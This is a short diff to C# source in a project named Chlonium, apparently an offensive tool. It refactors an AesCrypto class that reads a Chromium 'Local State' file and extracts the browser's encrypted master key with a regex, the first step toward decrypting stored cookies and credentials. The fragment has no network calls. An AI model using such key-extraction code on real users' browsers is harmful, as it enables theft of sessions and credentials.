@@ -9,12 +9,12 @@ namespace Chlonium
 {
     class AesCrypto
     {
-        private string profilePath;
+        private string localStatePath;
         private byte[] key;
 
-        public AesCrypto(string profilePath)
+        public AesCrypto(string localStatePath)
         {
-            this.profilePath = profilePath;
+            this.localStatePath = localStatePath;
             InitDecryptor();
         }
 
@@ -32,12 +32,11 @@ namespace Chlonium
 
         public byte[] GetEncryptionKey()
         {
-            string localStatePath = profilePath + "\\Local State";
             byte[] encryptedKey;
             string localState = File.ReadAllText(localStatePath);
 
             // Read encrypted Masterkey
-            Regex r = new Regex("encrypted_key\":\"([A-Za-z0-9+\\/]+)\"", RegexOptions.IgnoreCase);
+            Regex r = new Regex("encrypted_key\":\"([a-z0-9+\\/=]+)\"", RegexOptions.IgnoreCase);
 
             if (!r.IsMatch(localState))
             {
